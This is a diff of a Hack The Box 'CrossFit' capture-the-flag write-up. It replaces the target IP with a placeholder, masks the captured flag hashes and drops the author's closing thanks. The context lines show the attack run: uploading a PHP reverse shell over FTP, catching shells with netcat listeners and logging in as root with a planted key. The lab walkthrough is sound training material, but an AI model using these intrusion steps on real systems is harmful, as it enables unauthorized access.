@@ -1099,13 +1095,13 @@ Password hashes with `$6` at the beginning are most likely Unix sha512crypt encr
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ ssh hank@10.10.10.208                                                                           1 ⨯
-The authenticity of host '10.10.10.208 (10.10.10.208)' can't be established.
+└─$ ssh hank@<YOUR_IP>                                                                           1 ⨯
+The authenticity of host '<YOUR_IP> (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:tUOAuaaEof1kTFd4m9xiLiHk2k/pKSRnwhASRLb89Bo.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? y
 Please type 'yes', 'no' or the fingerprint: yes
-Warning: Permanently added '10.10.10.208' (ECDSA) to the list of known hosts.
-hank@10.10.10.208's password: 
+Warning: Permanently added '<YOUR_IP>' (ECDSA) to the list of known hosts.
+hank@<YOUR_IP>'s password: 
 Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -1131,7 +1127,7 @@ lrwxrwxrwx 1 root root    9 May 13  2020 .mysql_history -> /dev/null
 -rw-r--r-- 1 hank hank  807 Apr 18  2019 .profile
 -r--r----- 1 root hank   33 Jan 15 00:50 user.txt
 hank@crossfit:~$ cat user.txt 
-9e326def2df97f2b7ac41362a8d8f446
+****
 ```
 
 After cracking the hash to get the password I fired up SSH and logged in as `hank`.  The first thing I did was collect my hard-earned proof.
@@ -1166,7 +1162,7 @@ hank@crossfit:~$ ip a
        valid_lft forever preferred_lft forever
 2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
     link/ether 00:50:56:b9:60:c9 brd ff:ff:ff:ff:ff:ff
-    inet 10.10.10.208/24 brd 10.10.10.255 scope global ens160
+    inet <YOUR_IP>/24 brd <YOUR_IP> scope global ens160
        valid_lft forever preferred_lft forever
     inet6 dead:beef::250:56ff:feb9:60c9/64 scope global dynamic mngtmpaddr 
        valid_lft 85816sec preferred_lft 13816sec
@@ -1478,9 +1474,9 @@ Unfortunately, the SSH configuration was set to explicitly deny `ftpadm` from lo
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ lftp -u ftpadm 10.10.10.208 -e "set ssl:verify-certificate no"                                  1 ⨯
+└─$ lftp -u ftpadm <YOUR_IP> -e "set ssl:verify-certificate no"                                  1 ⨯
 Password: 
-lftp ftpadm@10.10.10.208:~> ls                   
+lftp ftpadm@<YOUR_IP>:~> ls                   
 drwxrwx---    2 1003     116          4096 Sep 21 10:19 messages
 ```
 
@@ -1682,7 +1678,7 @@ I logged into MySQL using the same credentials as before, and checked for the fi
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ nc -lvnp 8099
 listening on [any] 8099 ...
-connect to [10.10.14.176] from (UNKNOWN) [10.10.10.208] 53362
+connect to [10.10.14.176] from (UNKNOWN) [<YOUR_IP>] 53362
 bash: cannot set terminal process group (1855): Inappropriate ioctl for device
 bash: no job control in this shell
 isaac@crossfit:~$ test
@@ -1703,12 +1699,12 @@ I looked back through the code in `send_updates.php` looking for clues for how t
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ lftp -u ftpadm 10.10.10.208 -e "set ssl:verify-certificate no" 
+└─$ lftp -u ftpadm <YOUR_IP> -e "set ssl:verify-certificate no" 
 Password: 
-lftp ftpadm@10.10.10.208:~> put ~/rev-php.php    
+lftp ftpadm@<YOUR_IP>:~> put ~/rev-php.php    
 put: /home/zweilos/rev-php.php: Access failed: 553 Could not create file. (rev-php.php)
-lftp ftpadm@10.10.10.208:/> cd messages/
-lftp ftpadm@10.10.10.208:/messages> put ~/rev-php.php 
+lftp ftpadm@<YOUR_IP>:/> cd messages/
+lftp ftpadm@<YOUR_IP>:/messages> put ~/rev-php.php 
 73 bytes transferred
 ```
 
@@ -1742,7 +1738,7 @@ I lost my connection again due to an "unplanned network outage", so had to try a
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ nc -lvnp 10001                                                                                   1 ⨯
 listening on [any] 10001 ...
-connect to [10.10.14.176] from (UNKNOWN) [10.10.10.208] 54756
+connect to [10.10.14.176] from (UNKNOWN) [<YOUR_IP>] 54756
 bash: cannot set terminal process group (2913): Inappropriate ioctl for device
 bash: no job control in this shell
 isaac@crossfit:~$
@@ -2265,7 +2261,7 @@ I verified that the randomly generated file was symlinked to `/root/.ssh/authori
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ ssh root@10.10.10.208 -i root.key                                                            130 ⨯
+└─$ ssh root@<YOUR_IP> -i root.key                                                            130 ⨯
 Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -2299,7 +2295,7 @@ lrwxrwxrwx  1 root root    9 May  4  2020 .mysql_history -> /dev/null
 -rw-r--r--  1 root root   74 May  5  2020 .selected_editor
 drwx------  2 root root 4096 Sep  2  2020 .ssh
 root@crossfit:~# cat root.txt 
-ee0a62a5b513a67db05897a2ec478c80
+****
 ```
 
 Finally! I had to keep trying to log in through SSH, as it wasn't until my files got deleted that I was successful. I was able to tell that my files got deleted because I suddenly began getting spammed with an error message from my script.
@@ -2316,7 +2312,3 @@ Finally! I had to keep trying to log in through SSH, as it wasn't until my files
 As you can see...I got tired of even typing out `test.sh` and simply called my script `t`. I almost was about to write another script that would send my files over, `chmod +x` them, and run the exploit script, but just before I did that the exploit finally worked!
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-crossfit-pwned.png)
-
-Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033) for creating such a fun and challenging machine.  I am grateful that while it involved reverse engineering a C binary file, it did not involve advanced buffer overflows or anything like that \(looking at you Rope and Rope2...\).  I had to learn a number of new things to complete this machine such as writing code in JavaScript and C, both of which I am not that familiar.  Overall this was a great challenge and I definitely look forward to more like this!
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
